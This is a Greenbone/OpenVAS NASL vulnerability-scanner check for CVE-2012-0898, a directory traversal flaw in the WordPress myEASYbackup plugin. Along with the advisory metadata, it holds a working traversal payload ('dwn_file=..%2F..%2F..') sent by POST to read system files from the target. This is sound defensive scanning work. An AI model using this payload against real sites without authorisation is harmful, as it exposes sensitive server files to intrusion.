# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802380");
  script_version("2025-04-15T05:54:49+0000");
  script_cve_id("CVE-2012-0898");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2012-01-17 12:16:44 +0530 (Tue, 17 Jan 2012)");
  script_name("WordPress myEASYbackup Plugin 'dwn_file' Parameter Directory Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");

  script_xref(name:"URL", value:"http://secunia.com/advisories/47594");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51433");
  script_xref(name:"URL", value:"http://www.securelist.com/en/advisories/47594");
  script_xref(name:"URL", value:"http://forums.cnet.com/7726-6132_102-5261356.html");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/108711/wpmyeasybackup-traversal.txt");

  script_tag(name:"impact", value:"Successful exploitation could allow attackers to read arbitrary
  files via directory traversal attacks and gain sensitive information.");

  script_tag(name:"affected", value:"WordPress myEASYbackup Plugin version 1.0.8.1");

  script_tag(name:"insight", value:"The flaw is due to an input validation error in 'dwn_file'
  parameter to 'wp-content/plugins/myeasybackup/meb_download.php', which allows
  attackers to read arbitrary files via a ../(dot dot) sequences.");

  script_tag(name:"solution", value:"Update to WordPress myEASYbackup Plugin version 1.0.9 or
  later.");

  script_tag(name:"summary", value:"WordPress myEASYbackup Plugin is prone to a directory traversal vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/myeasybackup/");
  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("host_details.inc");
include("os_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

path = dir + "/wp-content/plugins/myeasybackup/meb_download.php";
files = traversal_files();

useragent = http_get_user_agent();

# nb: http_host_name() should be always after the static string(s) above but always after any
# dynamically ones (e.g. a random string) which should be different for each hostname.
host = http_host_name(port:port);

foreach file (keys(files)){

  postData = "dwn_file=..%2F..%2F..%2F..%2F"+ files[file] + "&submit=submit";

  req = string("POST ", path, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "User-Agent: ", useragent, "\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(postData),
               "\r\n\r\n", postData);
  res = http_send_recv(port:port, data:req);

  if(egrep(pattern:file, string:res)){
    report = http_report_vuln_url(port:port, url:path);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
